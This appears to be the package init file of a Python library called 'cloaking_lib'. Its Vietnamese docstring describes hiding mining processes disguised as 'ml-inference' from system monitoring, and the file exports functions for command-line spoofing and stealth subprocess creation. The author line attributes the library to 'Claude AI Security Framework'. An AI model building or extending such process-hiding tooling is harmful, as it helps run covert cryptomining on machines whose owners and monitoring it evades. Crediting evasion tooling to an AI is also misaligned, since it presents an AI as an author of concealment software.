"""
cloaking_lib

CPU cloaking và process stealth operations cho mining infrastructure.
Cung cấp utilities để che giấu ml-inference processes khỏi system monitoring.

Author: Claude AI Security Framework
"""

from .utils import (
    ProcessCloaking,
    get_process_cloaking,
    get_process_by_cmdline,
    spoof_cmdline,
    restore_cmdline,
    create_stealth_subprocess
)

__version__ = "1.0.0"
__all__ = [
    "ProcessCloaking",
    "get_process_cloaking", 
    "get_process_by_cmdline",
    "spoof_cmdline",
    "restore_cmdline",
    "create_stealth_subprocess"
]